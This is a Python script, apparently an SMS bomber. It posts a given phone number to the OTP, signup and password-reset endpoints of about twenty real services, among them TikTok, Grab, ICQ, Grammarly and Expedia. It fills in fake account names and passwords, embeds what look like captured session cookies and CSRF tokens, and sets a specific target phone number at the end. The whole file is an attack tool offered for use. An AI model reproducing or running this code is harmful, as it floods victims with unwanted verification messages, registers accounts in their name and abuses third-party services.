#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import requests
import os
import time
import random

def vnayComVn(phone): #phone = +84943687522
	link = "https://phone.headlines.pw/v1/verify_code/send"
	data = {
		"login_token": "", 
		"uid": "", 
		"phone": "",
		"verify_type": "login", 
		"source": "web"
			}
	data["phone"] = "+84" + phone[1:]
	res = requests.post(link, json = data)
	return(res, res.text)
		
def tikTok(phone): #phone = 943687522
	link = "https://www.tiktok.com/node/send/download_link"
	data = {
		"Mobile": "",
		"PhoneRegin": "VN",
		"language": "vi",
		"page": {"af_adset_id": 0, "pid": 1},
		"slideVerify": 0
			}
	data["Mobile"] = phone[1:]
	res = requests.post(link, json = data)
	if '"StatusMessage":"","StatusCode":0' in res.text:
		return(True)
	else:
		return(False)

def tiki(phone): #phone = 0943687522
	link = "https://tiki.vn/api/v2/customers/otp_codes"
	data = {"phone_number": ""}
	data["phone_number"] = phone
	res = requests.post(link, json = data)
	if '{"sent":true}' in res.text:
		return(True)
	else:
		return(False)

def sendo(phone): #phone = 0943687522
	link = "https://www.sendo.vn/a/mob/user/register/valid-unique"
	data = {"username": ""}
	data["username"] = phone
	res = requests.post(link, json = data)
	if '"err_code":0' in res.text:
		return(True)
	else:
		return(False)

def oyorooms(phone): #phone = 943687522
	link = "https://www.oyorooms.com/api/pwa/generateotp?locale=vi"
	data = {
		"phone":"",
		"country_code":"+84",
		"nod":"4"
			}
	data["phone"] = phone[1:]
	res = requests.post(link, data = data)
	return(res,res.text)

def phongVu(phone): #phone = 0943687522
	link = "https://phongvu.vn/api-v2/user/register"
	data = {
		"telephone": "",
		"password": "",
		"name": "tran pham thao nhi", 
		"email": ""
			}
	data["telephone"] = phone
	data["email"] = "thaonhi{0}@gmail.com".format(phone[4:7])
	data["password"] = "Th1sIsMy{0}P@ssw0rd".format(phone[1:3])
	res = requests.post(link, json = data)
	return(res, res.text)

def lozi(phone): #phone = 0943687522
	link = "https://latte.lozi.vn/v1.2/auth/register/phone"
	data = {
		"countryCode": "84",
		"device": "deviceAnony",
		"password": "xuannguyen123@",
		"phoneNumber": "0945871267",
		"platform": "Chrome/78.0.3904.97",
			}
	data["phoneNumber"] = phone
	data["password"] = "Th1sIsMy{0}P@ssw0rd".format(phone[1:3])
	res = requests.post(link, json = data)
	return(res, res.text)


def baza(phone): #phone = 0943687522
	link = "https://baza.vn/api/Acc"
	data = {
		"email": "",
		"mobile": "",
		"op": "register",
		"password": "0256987316@z123",
		"returnUrl": "",
		"sex": "0",
		"userName": ""
			}
	data["phone"] = phone
	data["password"] = "Pwd{0}@{1}".format(phone[1:3],phone[1:3])
	res = requests.post(link, json = data)
	return(res, res.text)

def conCung(phone): #phone = 0943687522
	link = "https://concung.com/ajax.php?registrynew=1"
	data = {
		"name" : "Bao Nhi",
		"passwords" : "Ssd5@#$dsf5v4SADF",
		"phone" : ""
			}
	data["phone"] = phone
	res = requests.post(link, data=data)
	link = "https://concung.com/ajax.php?resetpass=1"
	data = {"phone": ""}
	data["phone"] = phone
	res = requests.post(link, data = data)
	return(res, res.text)

def grab(phone): #phone = 84943687522
	link = "https://api.grab.com/grabid/v1/oauth2/otp"
	data = {
		"client_id":"4da4649307cc4bfaa16b08d03432535e",
		"transaction_ctx":"null",
		"country_code":"VN",
		"method":"",
		"num_digits":"6",
		"phone_number":""
		}
	data["phone_number"] = "84" + phone[1:]
	data["method"] = "SMS"
	# data["method"] = "CALL"
	res = requests.post(link,json=data)
	return(res,res.text)

def icq(phone): #phone = 84943687522
	link = "https://u.icq.net/api/v14/rapi/auth/sendCode"
	data = {"reqId":"45039-1594822103","params":{"phone":"","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
	data["params"]["phone"] = "84" + phone[1:]
	res = requests.post(link,json=data)
	return(res,res.text)


def unacademy(phone): #phone = 943687522
	link = "https://unacademy.com/api/v3/user/user_check/"
	data = {
		"phone":"943687522",
		"country_code":"VN",
		"otp_type":1,
		"email":"",
		"send_otp":"true",
		"is_un_teach_user":"false"
		}
	data["phone"] = phone[1:]
	res = requests.post(link, json=data)
	return(res,res.text)

def _91comvn(phone): #phone = 0943687522
	link = "https://91.com.vn:29119"

	data = {
		"api":"reg_ver_3",
		"gender":0,
		"bir":"19991510",
		"user_name":"Nguyen Nguyen",
		"application_version":"4",
		"applicaton_type":4,
		"device_type":2,
		"device_id":"Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
		"os_version":"Linux x86_64",
		"device_name":"Web",
		"source":"SMS",
		"phone_number":""
		}
	data["phone_number"] = phone 
	res = requests.post(link, json = data)
	return(res,res.text)

def tokhaiyte(phone): #phone = 0943687522
	link = "https://tokhaiyte.vn/api/Member/User/checkLogin"
	data = {"username" : ""}
	data["username"] = phone
	res = requests.post(link, data=data)
	return(res,res.text)

def fptplay(phone): #phone = 0943687522
	link = "https://api.fptplay.net/api/v6.2_w/user/otp/register_otp?st=gZKu_qCnB0pq9gKqnkW8gA&e=1597810764600&device=Firefox(version:68)"
	json = {"phone":"","country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8","st":"gZKu_qCnB0pq9gKqnkW8gA","e":1597810764600}
	json["phone"] = phone
	data1 = requests.post(link,json=json).text
	# -------------------
	link = "https://api.fptplay.net/api/v6.2_w/user/otp/reset_password_otp?st=MUQMNlHQAgm9f6pblqsp1A&e=1597810825600&device=Firefox(version:68)"
	json = {"phone":"","country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8","st":"MUQMNlHQAgm9f6pblqsp1A","e":1597810825600}
	json["phone"] = phone
	data2 = requests.post(link, json=json).text
	return(data1,data2)

def grammarly(phone): #phone = 84943687522
	link = "https://irbis.grammarly.com/api/twilio"
	json = {"phoneNumber":""}
	json["phoneNumber"] = phone
	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0",
		"x-csrf-token": "AABIPSfqpzEydwnBZ+BgEyWJ7NhVpA4DJr//Uw",
		"Cookie": "grauth=AABIPXCnhgJWOmr-0febyFK8A-iZph5eLOShq1HCUpaiVia1qJDhOu3ZF4_wB_fLh_E-Xt0OojJrbs4_; csrf-token=AABIPSfqpzEydwnBZ+BgEyWJ7NhVpA4DJr//Uw; gnar_containerId=nbseb0n0pqno1g2; funnelType=free; browser_info=FIREFOX:47:COMPUTER:SUPPORTED:FREEMIUM:LINUX:LINUX; redirect_location=eyJ0eXBlIjoiIiwibG9jYXRpb24iOiJodHRwczovL3d3dy5ncmFtbWFybHkuY29tL2tleWJvYXJkIn0=; _gcl_au=1.1.1018445827.1597846753; _uetsid=0e91729c81e73eebd03efee7f9d41033; _uetvid=4ca8c482e29eaefbe47bc481810fae49",
		}
	res = requests.post(link, json = json, headers = headers)
	return(res,res.text)

def expedia(phone): #phone = 0943687522
	link = "https://www.expedia.com.vn/T2DGenProxy?serviceID=TXT_MOBILEAPP_LINK"
	headers = {
		"Host": "www.expedia.com.vn",
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0",
		"X-Requested-With": "XMLHttpRequest",
		"Cookie": "JSESSION=815e61dc-0066-4e8f-9fa7-ee90ca91bdb6; CRQS=t|71`s|71`l|vi_VN`c|VND; CRQSS=e|0; tpid=v.1,71; iEAPID=0; linfo=v.4,|0|0|255|1|0||||||||1066|0|0||0|0|0|-1|-1; currency=VND; HMS=7110dd97-3b25-4ecb-9f1b-e51302d906cf; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; MC1=GUID=dfadeb62949449e8972daee73881daa8; DUAID=dfadeb62-9494-49e8-972d-aee73881daa8; ak_bmsc=4E4F5768687D874717ABCA5F90DFB11371ABE76A9E120000F9433D5FCAD3864B~plHDEc1yaZW50ZCY9x6ymXMzA0FUK02yWry7evurceWcGHaAFffEfhzNHAiURAUwqmwUQAgVcUibdUlozLco3J9wSr/gIde+T0Jn87Q4rBopHTpbGRmb76XUlCyoS8Qe8xeNJeTMuIpb8uh2DimXEyynH7nIeFkBW2vWvPPnmEBIJWrqGTwhK9ihCBrTwg+sHMaSuCfCOKO5edO/02F9ab3Zg87gkpuW4bJgi7KDMGjzw=; JSESSIONID=A9D168750AA01E80EED898CA92198896; cesc=%7B%22marketingClick%22%3A%5B%22false%22%2C1597850671837%5D%2C%22hitNumber%22%3A%5B%228%22%2C1597850671837%5D%2C%22visitNumber%22%3A%5B%221%22%2C1597850624661%5D%2C%22entryPage%22%3A%5B%22page.404-Not-Found%22%2C1597850671837%5D%7D; aspp=v.1,0|||||||||||||; pwa_csrf=402962a0-1b2b-4cba-9168-79c5e0fb4116|nW1QVFU15D_N1WBsHI9atEC8AGsI0bgnTiC5pQzx4Ki6edO6qea9VylIfsDoK9NAfWFkOG7GH_pQgOvilO4rnA; AMCV_C00802BE5330A8350A490D4C%40AdobeOrg=1585540135%7CMCIDTS%7C18494%7CMCMID%7C24672063232123212010771061176072798171%7CMCAID%7CNONE%7CMCOPTOUT-1597857734s%7CNONE%7CvVersion%7C4.4.0; AMCVS_C00802BE5330A8350A490D4C%40AdobeOrg=1"
			}
	data = {
		"mobile_phone": "",
		"data_app": "app_66",
		"country_calling_code": 1,
		# "page_name": "unknown"
		"page_name": "Hacked :))"
		}
	data["mobile_phone"] = phone
	res = requests.post(link,data=data, headers = headers)
	return(res,res.text)

def bandlab(phone): #phone = 84943687522
	link = "https://www.bandlab.com/api/v1.3/phones/84{0}/codes".format(phone[1:])
	res = requests.post(link).json()
	return(res,res.text)

def tgdd(phone): #phone = 0943687522
	link = "https://www.thegioididong.com/lich-su-mua-hang/Home/GetVerifyCode"
	json = {
		"phoneNumber": "",
		"IsReSend": "false"
		}
	json["phoneNumber"] = phone
	res = requests.post(link,json=json)
	return(res,res.text)

phone = "0913433155" #phuong khi

